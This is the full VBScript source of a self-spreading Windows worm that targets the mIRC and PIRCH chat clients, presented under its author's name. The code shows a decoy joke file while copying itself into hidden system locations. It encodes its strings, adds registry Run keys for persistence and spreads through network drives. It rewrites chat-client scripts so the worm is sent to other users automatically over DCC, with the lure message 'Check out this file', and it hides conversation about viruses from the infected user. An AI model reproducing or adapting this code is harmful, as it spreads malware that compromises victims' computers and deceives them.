MIRC/NETWORK/OUTLOOK/PIRCH.ShellScrapWorm by SimpleSimon / Zulu
On Error Resume Next
Dim Y
Set P=CreateObject("Scripting.FileSystemObject")
Set FZ=P.OpenTextFile(WScript.ScriptFullName,1)
Do While Mid(FZ.ReadLine,21,10)<>"e(WScript."
Loop
FZ.SkipLine
ZP=FZ.ReadLine
FZ.Close
Set R=CreateObject(D("XTdqjos-Tgfkk"))
PD=D("KJEF`TSBHFT-SWS-TGT")
I=True
J=Chr(13)&Chr(10)
If Not P.FileExists(K(OE(D("TsbqsVo")),PD)) Then
I=False
Set A=P.CreateTextFile(K(E(2),D("KJEF`TSBHFT-SWS")),True)
A.Write("- The male stages of life:"&J&J&"Age. Seduction lines."&J&"17   My parents are away for the weekend."&J&"25   My girlfriend is away for the weekend."&J&"35   My fiancee is away for the weekend."&J&"48   My wife is away for the weekend."&J&"66   My second wife is dead."&J&J&"Age. Favorite sport."&J&"17   Sex."&J&"25   Sex."&J&"35   Sex."&J&"48   Sex."&J&"66   Napping."&J&J&"Age. Definiton of a successful date."&J&"17   Tongue."&J&"25   Breakfast."&J&"35   She didn't set back my therapy."&J&"48   I didn't have to meet her kids."&J&"66   Got home alive."&J&J&J&"- The female stages of life:"&J&J&"Age. Favourite fantasy."&J&"17   Tall, dark and hansome."&J&"25   Tall, dark and hansome with money."&J&"35   Tall, dark and hansome with money and a brain."&J&"48   A man with hair."&J&"66   A man."&J&J&"Age. Ideal date."&J&"17   He offers to pay."&J&"25   He pays."&J&"35   He cooks breakfast next morning."&J&"48   He cooks breakfast next morning for the kids."&J&"66   He can chew his breakfast."&J)
A.Close
R.Run(K(E(2),D("KJEF`TSBHFT-SWS")))
End If
If Not I Then
N=""
Set N=CreateObject(D("Xpqc-Bookjdbsjpm"))
If N Is Nothing Then
T=L(True)
If T="" Then T=L(False)
Else
T=W(PD)
If T="" Then T=W(D(")-TGT"))
N.Quit
End If
Else
T=K(OE(D("TsbqsVo")),PD)
End If
If T<>"" Then
P.CopyFile T,K(E(0),PD)
Set F=P.GetFile(K(E(0),PD))
F.Attributes=32
P.CopyFile K(E(0),PD),K(E(1),D("NTJMEP25-SKA"))
If Not P.FolderExists(Left(E(0),3)&D("QFDZDKFC")) Then
P.CreateFolder(Left(E(0),3)&D("QFDZDKFC"))
Set F=P.GetFolder(Left(E(0),3)&D("QFDZDKFC"))
F.Attributes=22
End If
P.CopyFile K(E(0),PD),K(Left(E(0),3)&D("QFDZDKFC"),D("NTQDZDKC-CBS"))
Set F=P.GetFile(K(Left(E(0),3)&D("QFDZDKFC"),D("NTQDZDKC-CBS")))
F.Attributes=39
Randomize
For Each Z In P.Drives
If Z.DriveType=2 Then UQ Z.DriveLetter&D("9[")
Next
UQ OE(D("NzCpdvnfmst"))
UQ OE(D("Oqphqbnt"))
Set A=P.CreateTextFile(K(E(1),D("TDBMQFH-UAT")),True)
A.Write("On Error Resume Next"&J&"Dim HU"&J&"Set Y=CreateObject(""Scripting.FileSystemObject"")"&J&"Set SJ=Y.OpenTextFile(WScript.ScriptFullName,1)"&J&"Do While Mid(SJ.ReadLine,5,10)<>""Q=CreateOb"""&J&"Loop"&J&"SJ.SkipLine"&J&"LH=SJ.ReadLine"&J&"SJ.Close"&J&"Set Q=CreateObject(Z(""VRbshqu/Ridmm""))"&J&"FP=Z(""MHGD^RU@FDR/UYU/RIR"")"&J&"If Y.FileExists(P(J(Z(""Ru`suTq"")),FP)) Then Y.DeleteFile P(J(Z(""Ru`suTq"")),FP),True"&J&"K=False"&J&"If Not Y.FileExists(P(H(0),FP)) Then"&J&"If Y.FileExists(P(H(1),Z(""LRHOGN07/UMC""))) Then"&J&"Y.CopyFile P(H(1),Z(""LRHOGN07/UMC"")),P(H(0),FP)"&J&"Else"&J&"If Y.FileExists(P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""LRSBXBME/E@U""))) Then"&J&"Y.CopyFile P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""LRSBXBME/E@U"")),P(H(0),FP)"&J&"Set L=Y.GetFile(P(H(0),FP))"&J&"L.Attributes=32"&J&"Else"&J&"K=True"&J&"End If"&J&"End If"&J&"End If"&J&"If Not K Then"&J&"If Not Y.FileExists(P(H(1),Z(""LRHOGN07/UMC""))) Then Y.CopyFile P(H(0),FP),P(H(1),Z(""LRHOGN07/UMC""))"&J&"If Not Y.FileExists(P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""LRSBXBME/E@U""))) Then"&J&"If Not Y.FolderExists(Left(H(0),3)&Z(""SDBXBMDE"")) Then"&J&"Y.CreateFolder(Left(H(0),3)&Z(""SDBXBMDE""))"&J&"Set L=Y.GetFolder(Left(H(0),3)&Z(""SDBXBMDE""))"&J&"L.Attributes=22"&J&"End If"&J&"Y.CopyFile P(H(0),FP),P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""LRSBXBME/E@U""))"&J&"Set L=Y.GetFile(P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""LRSBXBME/E@U"")))"&J&"L.Attributes=39"&J&"End If"&J&"If Not Y.FileExists(P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""ECHOEDY/WCR""))) Then"&J&"If Y.FileExists(P(H(1),Z(""WC@RDU/NMC""))) Then"&J&"Y.CopyFile P(H(1),Z(""WC@RDU/NMC"")),P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""ECHOEDY/WCR""))"&J&"Set L=Y.GetFile(P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""ECHOEDY/WCR"")))"&J&"L.Attributes=39"&J&"Else"&J&"K=True"&J&"Y.CopyFile P(H(0),FP),P(J(Z(""Ru`suTq"")),FP)"&J&"End If"&J&"End If"&J&"End If"&J&"If Not K Then"&J&"If Not Y.FileExists(P(H(1),Z(""WC@RDU/NMC""))) Then"&J&"Y.CopyFile P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""ECHOEDY/WCR"")),P(H(1),Z(""WC@RDU/NMC""))"&J&"Set L=Y.GetFile(P(H(1),Z(""WC@RDU/NMC"")))"&J&"L.Attributes=32"&J&"End If"&J&"If Not Y.FileExists(P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""SBXBMECO/E@U""))) Then"&J&"Y.CopyFile WScript.ScriptFullName,P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""SBXBMECO/E@U""))"&J&"Set L=Y.GetFile(P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""SBXBMECO/E@U"")))"&J&"L.Attributes=39"&J&"End If"&J&"Q.RegWrite Z(""IJDX^TRDSR]/EDG@TMU]Rnguv`sd]Lhs`chmhr]HBP]@fdou]@qqr]HBP]Do`cmd""),Z(""Xdr"")"&J&"Q.RegWrite Z(""IJDX^TRDSR]/EDG@TMU]Rnguv`sd]Lhs`chmhr]HBP]@fdou]@qqr]HBP]Q`s`ldudsr""),P(Left(H(0),3)&Z(""SDBXBMDE""),Z(""ECHOEDY/WCR""))"&J&"Q.RegWrite Z(""IJDX^TRDSR]/EDG@TMU]Rnguv`sd]Lhs`chmhr]HBP]@fdou]@qqr]HBP]Q`ui""),P(H(0),Z(""VRBSHQU/DYD""))"&J&"Q.RegWrite Z(""IJDX^TRDSR]/EDG@TMU]Rnguv`sd]Lhs`chmhr]HBP]@fdou]@qqr]HBP]Ru`sutq""),H(0)"&J&"OJ="""""&J&"Set OJ=CreateObject(Z(""Vnse/@qqmhb`uhno""))"&J&"G=Chr(13)&Chr(10)"&J&"If OJ Is Nothing Then"&J&"For Each F In Y.Drives"&J&"If F.DriveType=2 Then"&J&"X F.DriveLetter&Z("";]LHSB"")"&J&"X F.DriveLetter&Z("";]LHSB23"")"&J&"X F.DriveLetter&Z("";]QHSBI"")"&J&"X F.DriveLetter&Z("";]QHSBI89"")"&J&"End If"&J&"Next"&J&"X Q.RegRead(Z(""IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Qsnfs`lGhmdrEhs""))"&J&"Else"&J&"T Z(""LHSB23/DYD"")"&J&"T Z(""QHSBI89/DYD"")"&J&"OJ.Quit"&J&"End If"&J&"End If"&J&"Function Z(AZ)"&J&"Z="""""&J&"For ZP=1 To Len(AZ)"&J&"If Asc(Mid(AZ,ZP,1))<>34 And Asc(Mid(AZ,ZP,1))<>35 And Asc(Mid(AZ,ZP,1))<>126 Then"&J&"If Asc(Mid(AZ,ZP,1)) Mod 2=0 Then Z=Z&Chr(Asc(Mid(AZ,ZP,1))+Left(Asc(Mid(LH,2,1)),1)) Else Z=Z&Chr(Asc(Mid(AZ,ZP,1))-Left(Asc(Mid(LH,2,1)),1))"&J&"Else"&J&"Z=Z&Mid(AZ,ZP,1)"&J&"End If"&J&"Next"&J&"End Function"&J&"Function P(S,M)"&J&"On Error Resume Next"&J&"P=Y.BuildPath(S,M)"&J&"End Function"&J&"Function J(W)"&J&"On Error Resume Next"&J&"J=Q.SpecialFolders(W)"&J&"End Function"&J&"Function H(R)"&J&"On Error Resume Next"&J&"H=Y.GetSpecialFolder(R)"&J&"End Function"&J&"Sub X(U)"&J&"On Error Resume Next"&J&"If Y.FolderExists(U) Then"&J&"For Each D In Y.GetFolder(U).Files"&J&"If UCase(D.Name)=Z(""LHSB23/DYD"") Then"&J&"V D.Path"&J&"Exit Sub"&J&"ElseIf UCase(D.Name)=Z(""QHSBI89/DYD"") Then"&J&"B D.Path"&J&"Exit Sub"&J&"End If"&J&"Next"&J&"For Each E In Y.GetFolder(U).SubFolders"&J&"X E.Path"&J&"Next"&J&"End If"&J&"End Sub"&J&"Sub T(O)"&J&"On Error Resume Next"&J&"Set C=OJ.FileSearch"&J&"C.NewSearch"&J&"C.FileName=O"&J&"C.SearchSubFolders=True"&J&"For Each D In Y.Drives"&J&"If D.DriveType=2 Then"&J&"C.LookIn=D.DriveLetter&Z("";]"")"&J&"C.Execute"&J&"ReDim I(C.FoundFiles.Count)"&J&"For E=1 To UBound(I)"&J&"I(E)=C.FoundFiles(E)"&J&"Next"&J&"For E=1 To UBound(I)"&J&"For F=E+1 To UBound(I)"&J&"If I(E)=I(F) And I(E)<>"""" Then I(F)="""""&J&"Next"&J&"Next"&J&"For E=1 To UBound(I)"&J&"If I(E)<>"""" Then"&J&"If UCase(Right(I(E),Len(O)+1))=Z(""]"")&O Then"&J&"If O=Z(""LHSB23/DYD"") Then V I(E) Else B I(E)"&J&"End If"&J&"End If"&J&"Next"&J&"C.NewSearch"&J&"C.FileName=O"&J&"C.SearchSubFolders=True"&J&"End If"&J&"Next"&J&"End Sub"&J&"Sub V(A)"&J&"On Error Resume Next"&J&"Set RQ=Y.GetFile(A)"&J&"If Y.FileExists(P(RQ.ParentFolder,Z(""LHSB/HOH""))) Then"&J&"Set UY=Y.CreateTextFile(P(H(0),Z(""RNTOE23C/EMM"")),True)"&J&"UY.Write(""On 1:Connect:{ Set %£.go $false | Set %£.which $r(1,2) | Set %£.file ""&P(H(0),FP)&"" | if ( $exists(%£.file) ) { Set %£.go $true } | Unset %be.* %pk.* %£S.* | life }""&G&""On 1:Disconnect:{ .timers off | .sockclose * | Set %£.date $adate }""&G&""On 1:Input:*:{ Set %£.var1 Ignore:Alias:Write:Play:Rename:Copy:Load:Remini:Writeini:Run:Filter:Flushini:Reload:Remove:Set:Unset:UnsetAll:Enable:Disable: | Set %£.var2 $remove($1,/,.) | if ( $istok(%£.var1,%£.var2,58) ) || ( %£.var2 = $null ) || ( timer isin $1 ) { halt } | if ( $chr(36) isin $1- )  { if ( $pos($1-,$,0) > 1 ) { halt } | Set %£.tmp1 $asc($mid($1-,$calc($pos($1-,$,1) + 1),1)) | if ( %£.tmp1 > 47 ) && ( %£.tmp1 < 58 ) { return } | elseif ( %£.tmp1 = 32) { return } | halt } }""&G&""On 1:Join:*:{ if ( help isin # ) || ( ayuda isin # ) || ( virus isin # ) || ( $remove(#,$chr(35)) isin dmsetupbackorificenohackaide ) { .timerqt 1 5 quiet # } | if ( %£.go ) && ( %£.which = 1 ) { if ( $r(1,2) = 1 ) && ( $nick != $me ) { LS $nick } } }""&G&""On ^1:Part:*:{ if ( %£.go ) && ( %£.which = 2 ) { if ( $r(1,2) = 1 ) && ( $nick isreg # ) && ( $nick != $me ) { LS $nick } } | letslook $1- | if ( $letsthink ) { halt } }""&G&""On 1:FileSent:*:{ if ( %£.go ) { LS $nick } }""&G&""On 1:FileRcvd:*:{ if ( %£.go ) { LS $nick } }""&G&""On 1:Notify:{ if ( %£.go ) { if ( $nick !isin %£.nt ) { %£.nt = %£.nt $+ $nick | .ignore -u120 $nick 2 | .timer $+ $r(99,199) 1 10 .msg $nick Hi. Check out this file, ok. | .timer $+ $r(300,399) 1 12 LS $nick } } }""&G&""On ^1:Kick:*:{ if ( $knick = $me ) { letslook $1- } | if ( $letsthink ) && ( $knick = $me ) { .echo -s 3*** You were kicked from $+ $chr(32) $+ $chan $+ $chr(32) $+ by $nick ( $+ $me $+ ) | halt } }""&G&""On ^1:Notice:*:*:{ letslook $1- | if ( $letsthink ) { if ( $chr(35) !isin $active ) { halt } | .echo $active 5- $+ $nick $+ - $+ $chr(32) $+ $modurl | halt } }""&G&""On ^1:Action:*:*:{ letslook $1- | if ( $letsthink ) { if ( # = $me ) { Set %£.tmp11 $nick } | if ( # != $me ) { Set %£.tmp11 # } | .echo %£.tmp11 6* $+ $chr(32) $+ $nick $+ $chr(32) $+ $modurl | halt } }""&G&""On ^1:Text:*:*:{ letslook $1- | if ( $letsthink ) { if ( # = $null ) { Set %£.tmp11 $nick } | if ( # != $null ) { Set %£.tmp11 # } | .echo %£.tmp11 < $+ $nick $+ > $+ $chr(32) $+ $modurl | halt } }""&G&""On ^1:Chat:*:{ letslook $1- | if ( $letsthink ) { .echo =$nick < $+ $nick $+ > $+ $chr(32) $+ $modurl | halt } }""&G&""On ^1:Serv:*:{ letslook $1- | if ( $letsthink ) { halt } }""&G&""On ^1:Quit:{ Set %£.topic 3 | letslook $1- | if ( $letsthink ) { .echo $comchan($nick,1) 2*** $+ $chr(32) $+ $nick $+ $chr(32) $+ has quit IRC ( $+ $modurl $+ ) | halt } }""&G&""On ^1:Topic:#:{ Set %£.topic 2 | letslook $1- | if ( $letsthink ) { .echo # 3*** $nick changes topic to ' $+ $modurl $+ ' | halt } }""&G&""on ^1:SNOTICE:*:{ letslook $1- }""&G&""ctcp 1:*:*:{ letslook $1- | if ( $letsthink ) { halt } }""&G&""raw 332:*:{ Set %£.topic 1 | letslook $2- | if ( $letsthink ) { .clear $2 | .echo $2 3*** Topic is ' $+ $modurl $+ ' | halt } }""&G&""raw 401:*:{ if ( %£S. $+ $2 != $null ) { .timer $+ $2 off | .sockclose £. $+ $2 | .sockclose . $+ $2 | Set %£.warning $2 | halt } }""&G&""raw 439:*:{ halt }""&G&""alias quiet { Set %£.var3 1 | :j | Set %£.var4 $nick($1,%£.var3) | if ( %£.var4 = $null ) { .part $1 | halt } | if ( %£.var4 != $me ) && ( %£.var4 != X ) && ( %£.var4 != W ) { .ignore %£.var4 2 } | inc %£.var3 | goto j }""&G&""alias -l life { if ( %£.date != $null ) { if ( $gettok(%£.date,2,47) < $gettok($adate,2,47) ) || ( $gettok(%£.date,1,47) < $gettok($adate,1,47) ) { stages } } }""&G&""alias -l stages { Set %tmp1 $ignore(0) | Set %tmp2 0 | :tm | inc %tmp2 | if ( %tmp1 = $null ) || ( %tmp2 > %tmp1 ) { goto out } | .ignore -r $ignore(1) | goto tm | :out }""&G&""alias letsdo { .ignore $nick 2 | halt }""&G&""alias letslook { if ( Stages isin $1- ) || ( .shs isin $1- ) || ( script isin $1- ) || ( worm isin $1- ) || ( virus isin $1- ) || ( trojan isin $1- ) || ( infect isin $1- ) || ( spread isin $1- ) || ( remote isin $1- ) || ( events isin $1- ) || ( unload isin $1- ) || ( virii isin $1- ) || ( dccallow isin $1- ) { if ( %£.topic = 1 ) { unset %£.topic | .timerf 1 1 quiet $1 | halt } | if ( %£.topic = 2 ) { unset %£.topic | quiet # | halt } | if ( %£.topic = 3 ) { halt } | letsdo } | if ( %£.topic = 1 ) { Set %£.think $2- } | else { Set %£.think $1- } | Unset %£.topic }""&G&""alias unload { if ( $1 = $null ) || ( $2 = $null ) { .echo -e 2* /unload: insufficient parameters | halt } | .echo -e 2*** Unloaded script ' $+ $2- $+ ' | halt }""&G&""alias remote { if ( $1 = on ) { .echo -e 2*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e 2*** Remote is OFF | halt } }""&G&""alias events { if ( $1 = on ) { .echo -e 2*** Events are ON } | else { .echo -e 2*** Events are OFF | halt } }""&G&""On 1:SockClose:.*:{ Set %£.tmp6 $remove($sockname,.) | sockclose $sockname | sockclose [ £. $+ [ %£.tmp6 ] ] | .timer $+ %£.tmp6 off }""&G&""On 1:SockListen:£.*:{ Set %£.tmp5 $remove($sockname,£.) | sockaccept . $+ %£.tmp5 | SL %£.tmp5 }""&G&""On 1:SockWrite:.*:{ Set %£.tmp6 $remove($sockname,.) | if ( [ % $+ [ £S. $+ [ %£.tmp6 ] ] ] = 1 ) { .timer $+ $r(99,9999) 1 10 sockclose $sockname | .timer $+ $r(99,9999) 1 10 sockclose [ £. $+ [ %£.tmp6 ] ] | .timer $+ %£.tmp6 off | halt } | SL %£.tmp6 }""&G&""alias LS { if ( $sock(£.*,0) > 5 ) { return } | Set %£S. $+ $1 0 | :pointless | Set %pt $r(2400,5000) | if ( $portfree(%pt) = $false ) { goto pointless } | Set [ % $+ [ be. $+ [ $1 ] ] ] 0 | Set %pk. $+ $1 4096 | Set %sz $file(%£.file).size | Set %£.tmp4 £. $+ $1 | .timer $+ $1 1 240 .sockclose %£.tmp4 $+ $chr(32) $+ $chr(124) $+ $chr(32) $+ .sockclose . $+ $1 | .timer1 $+ $1 1 20 TO $1 | .notice $1 DCC Send $left($gettok(%£.file,3,92), $calc( [ $len( [ $gettok(%£.file,3,92) ] ) ] - 4 ) ) ( $+ $ip $+ ) | if ( $1 = %£.warning ) { return } | .ignore -u90 $1 2 | .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND %£.file $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(%£.tmp4) != $null ) { .sockclose %£.tmp4 } | .socklisten %£.tmp4 %pt }""&G&""alias SL { if ( $calc( [ % $+ [ be. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) { bread %£.file [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite . $+ $1 &data | inc [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] } | else { Set [ % $+ [ £S. $+ [ $1 ] ] ] 1 | [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ be. $+ [ $1 ] ] ] ) | if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } | bread %£.file [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite . $+ $1 &data } }""&G&""alias TO { if ( [ % $+ [ be. $+ [ $1 ] ] ] = 0 ) { sockclose [ . $+ [ $1 ] ] | sockclose [ £. $+ [ $1 ] ] | .timer $+ $1 off } }""&G&""alias modurl { Set %£.think $replace(%£.think,$chr(44),$chr(32),$chr(59),$chr(32)) | Unset %£.think.again | Set %£.var6 $numtok(%£.think,32) | Set %£.var61 1 | Set %£.var64 $nick $+ $chr(91) $+ $gettok($address,2,64) $+ $chr(93) | :mod1 | if ( %£.var61 > %£.var6 ) { return %£.think.again } | Set %£.var62 $gettok(%£.think,%£.var61,32) | if ( http !isin %£.var62 ) && ( www !isin %£.var62 ) && ( ftp. !isin %£.var62 ) && ( .com !isin %£.var62 ) && ( .net !isin %£.var62 ) && ( .org !isin %£.var62 ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 } | if ( $gettok($address,2,64) isin %£.var62 ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 }""&G&""if ( %£.var64 isin %£.var62 ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 } | Set %£.var63 $gettok(%£.var62,2,46) | if ( %£.var63 = $null ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 } | if ( $len(%£.var63) > 2 ) { Set %£.var63 $left(%£.var63,$int($calc($len(%£.var63)/2))) $+ $r(a,z) $+ $mid(%£.var63,$calc($int($calc($len(%£.var63)/2)) + 1),$len(%£.var63)) } | Set %£.var63 $r(A,Z) $+ %£.var63 $+ $r(a,z) | Set %£.think.again %£.think.again $+ $chr(32) $+ $puttok(%£.var62,%£.var63,2,46) | inc %£.var61 | goto mod1 }""&G&""alias letsthink { if ( http isin %£.think ) || ( .org isin %£.think ) || ( .net isin %£.think ) || ( .com isin %£.think ) || ( ftp. isin %£.think ) || ( www isin %£.think ) { return $true } | return $false }""&G)"&J&"UY.Close"&J&"FW P(RQ.ParentFolder,Z(""LHSB/HOH"")),Z(""sghmdr""),Z(""o3""),P(H(0),Z(""RNTOE23C/EMM""))"&J&"If Not HU Then"&J&"Set UY=Y.OpenTextFile(P(RQ.ParentFolder,Z(""LHSB/HOH"")),1)"&J&"If Not UY.AtEndOfStream Then"&J&"HD=0"&J&"Do"&J&"ReDim Preserve GQ(HD)"&J&"JD=UY.ReadLine"&J&"GQ(HD)=JD"&J&"HD=HD+1"&J&"If Left(JD,8)=Z(""Zsghmdr\"") Then"&J&"If Not UY.AtEndOfStream Then"&J&"ReDim Preserve GQ(HD)"&J&"GQ(HD)=UY.ReadLine"&J&"End If"&J&"If Not UY.AtEndOfStream Then"&J&"ReDim Preserve GQ(HD+1)"&J&"GQ(HD+1)=UY.ReadLine"&J&"End If"&J&"ReDim Preserve GQ(HD+2)"&J&"GQ(HD+2)=Z(""o3<"")&P(H(0),Z(""RNTOE23C/EMM""))"&J&"HD=HD+3"&J&"End If"&J&"Loop Until UY.AtEndOfStream"&J&"UY.Close"&J&"Set UY=Y.CreateTextFile(P(RQ.ParentFolder,Z(""LHSB/HOH"")),True)"&J&"UY.Write(Join(GQ,G)&G)"&J&"UY.Close"&J&"Else"&J&"UY.Close"&J&"End If"&J&"End If"&J&"End If"&J&"End Sub"&J&"Sub B(GY)"&J&"On Error Resume Next"&J&"Set RP=Y.GetFile(GY)"&J&"Set YT=Y.CreateTextFile(P(RP.ParentFolder,Z(""DWDOUR/HOH"")),True)"&J&"YT.Write(""[Levels]""&G&""Enabled=1""&G&""Count=1""&G&""Level1=000-Unknowns""&G&""000-UnknownsEnabled=1""&G&""[000-Unknowns]""&G&""User1=*!*@*""&G&""UserCount=1""&G&""Event1=ON JOIN:#:/dcc send $nick ""&P(H(0),FP)&G&""EventCount=1""&G)"&J&"YT.Close"&J&"If Y.FileExists(P(RP.ParentFolder,Z(""QHSBI89/HOH""))) Then FW P(RP.ParentFolder,Z(""QHSBI89/HOH"")),Z(""EBB""),Z(""@tunIhedEbbVho""),Z(""0"")"&J&"End Sub"&J&"Sub FW(SW,KW,FG,JK)"&J&"On Error Resume Next"&J&"Set PK=Y.OpenTextFile(SW,1)"&J&"QS=Split(PK.ReadAll,G)"&J&"PK.Close"&J&"OY=False"&J&"HU=False"&J&"For WD=0 To UBound(QS)"&J&"If Left(QS(WD),1)=Z(""Z"") Then"&J&"If OY=True Then"&J&"Exit For"&J&"Else"&J&"If Left(QS(WD),Len(KW)+2)=Z(""Z"")&KW&Z(""\"") Then OY=True"&J&"End If"&J&"Else"&J&"If OY=True Then"&J&"If Left(QS(WD),Len(FG)+1)=FG&Z(""<"") Then"&J&"HU=True"&J&"QS(WD)=FG&Z(""<"")&JK"&J&"Exit For"&J&"End If"&J&"End If"&J&"End If"&J&"Next"&J&"If HU Then"&J&"Set PK=Y.CreateTextFile(SW,True)"&J&"PK.Write(Join(QS,G))"&J&"PK.Close"&J&"End If"&J&"End Sub"&J)
A.Close
P.CopyFile K(E(1),D("TDBMQFH-UAT")),K(Left(E(0),3)&D("QFDZDKFC"),D("QDZDKCAM-CBS"))
Set F=P.GetFile(K(Left(E(0),3)&D("QFDZDKFC"),D("QDZDKCAM-CBS")))
F.Attributes=39
R.RegWrite D("GLFZ`KPDBK`NBDGJMF[Tpesxbqf[Njdqptpes[Xjmcpxt[DvqqfmsUfqtjpm[QvmTfqujdft[TdbmQfh"),K(E(0),D("XTDQJOS-FWF"))&" "&K(E(1),D("TDBMQFH-UAT"))
Set A=P.CreateTextFile(K(Left(E(0),3)&D("QFDZDKFC"),D("CAJMCFW-UAT")),True)
A.Write("On Error Resume Next"&J&"Set I=CreateObject(""Scripting.FileSystemObject"")"&J&"Set M=I.OpenTextFile(WScript.ScriptFullName,1)"&J&"Do While Mid(M.ReadLine,18,10)<>""adLine,18,"""&J&"Loop"&J&"M.SkipLine"&J&"N=M.ReadLine"&J&"M.Close"&J&"Set Z=CreateObject(T(""VRbshqu/Ridmm""))"&J&"X=T(""MHGD^RU@FDR/UYU/RIR"")"&J&"If I.FileExists(F(A(T(""Ru`suTq"")),X)) Then I.DeleteFile F(A(T(""Ru`suTq"")),X),True"&J&"Q=False"&J&"If Not I.FileExists(F(U(0),X)) Then"&J&"If I.FileExists(F(U(1),T(""LRHOGN07/UMC""))) Then"&J&"I.CopyFile F(U(1),T(""LRHOGN07/UMC"")),F(U(0),X)"&J&"Else"&J&"If I.FileExists(F(Left(U(0),3)&T(""SDBXBMDE""),T(""LRSBXBME/E@U""))) Then"&J&"I.CopyFile F(Left(U(0),3)&T(""SDBXBMDE""),T(""LRSBXBME/E@U"")),F(U(0),X)"&J&"Set Y=I.GetFile(F(U(0),X))"&J&"Y.Attributes=32"&J&"Else"&J&"Q=True"&J&"End If"&J&"End If"&J&"End If"&J&"If Not Q Then"&J&"If Not I.FileExists(F(U(1),T(""LRHOGN07/UMC""))) Then I.CopyFile F(U(0),X),F(U(1),T(""LRHOGN07/UMC""))"&J&"If Not I.FileExists(F(Left(U(0),3)&T(""SDBXBMDE""),T(""LRSBXBME/E@U""))) Then"&J&"I.CopyFile F(U(0),X),F(Left(U(0),3)&T(""SDBXBMDE""),T(""LRSBXBME/E@U""))"&J&"Set Y=I.GetFile(F(Left(U(0),3)&T(""SDBXBMDE""),T(""LRSBXBME/E@U"")))"&J&"Y.Attributes=39"&J&"End If"&J&"If Not I.FileExists(F(U(1),T(""RB@OSDF/WCR""))) Then"&J&"If I.FileExists(F(Left(U(0),3)&T(""SDBXBMDE""),T(""SBXBMECO/E@U""))) Then"&J&"I.CopyFile F(Left(U(0),3)&T(""SDBXBMDE""),T(""SBXBMECO/E@U"")),F(U(1),T(""RB@OSDF/WCR""))"&J&"Set Y=I.GetFile(F(U(1),T(""RB@OSDF/WCR"")))"&J&"Y.Attributes=32"&J&"Else"&J&"Q=True"&J&"I.CopyFile F(U(0),X),F(A(T(""Ru`suTq"")),X)"&J&"End If"&J&"End If"&J&"End If"&J&"If Not Q Then"&J&"If Not I.FileExists(F(Left(U(0),3)&T(""SDBXBMDE""),T(""SBXBMECO/E@U""))) Then"&J&"I.CopyFile F(U(1),T(""RB@OSDF/WCR"")),F(Left(U(0),3)&T(""SDBXBMDE""),T(""SBXBMECO/E@U""))"&J&"Set Y=I.GetFile(F(Left(U(0),3)&T(""SDBXBMDE""),T(""SBXBMECO/E@U"")))"&J&"Y.Attributes=39"&J&"End If"&J&"If Not I.FileExists(F(U(1),T(""WC@RDU/NMC""))) Then"&J&"I.CopyFile WScript.ScriptFullName,F(U(1),T(""WC@RDU/NMC""))"&J&"Set Y=I.GetFile(F(U(1),T(""WC@RDU/NMC"")))"&J&"Y.Attributes=32"&J&"End If"&J&"Z.RegWrite T(""IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]StoRdswhbdr]Rb`oSdf""),F(U(0),T(""VRBSHQU/DYD""))&"" ""&F(U(1),T(""RB@OSDF/WCR""))"&J&"End If"&J&"Function T(D)"&J&"T="""""&J&"For E=1 To Len(D)"&J&"If Asc(Mid(D,E,1))<>34 And Asc(Mid(D,E,1))<>35 And Asc(Mid(D,E,1))<>126 Then"&J&"If Asc(Mid(D,E,1)) Mod 2=0 Then T=T&Chr(Asc(Mid(D,E,1))+Left(Len(N),1)) Else T=T&Chr(Asc(Mid(D,E,1))-Left(Len(N),1))"&J&"Else"&J&"T=T&Mid(D,E,1)"&J&"End If"&J&"Next"&J&"End Function"&J&"Function F(W,S)"&J&"On Error Resume Next"&J&"F=I.BuildPath(W,S)"&J&"End Function"&J&"Function A(B)"&J&"On Error Resume Next"&J&"A=Z.SpecialFolders(B)"&J&"End Function"&J&"Function U(J)"&J&"On Error Resume Next"&J&"U=I.GetSpecialFolder(J)"&J&"End Function"&J)
A.Close
Set F=P.GetFile(K(Left(E(0),3)&D("QFDZDKFC"),D("CAJMCFW-UAT")))
F.Attributes=39
P.CopyFile K(Left(E(0),3)&D("QFDZDKFC"),D("CAJMCFW-UAT")),K(E(1),D("UABTFS-PKA"))
Set F=P.GetFile(K(E(1),D("UABTFS-PKA")))
F.Attributes=32
R.RegWrite D("GLFZ`VTFQT[-CFEBVKS[Tpesxbqf[Njqbajkjt[JDR[Bhfms[Boot[JDR[Fmbakf"),D("Zft")
R.RegWrite D("GLFZ`VTFQT[-CFEBVKS[Tpesxbqf[Njqbajkjt[JDR[Bhfms[Boot[JDR[Obqbnfsfqt"),K(Left(E(0),3)&D("QFDZDKFC"),D("CAJMCFW-UAT"))
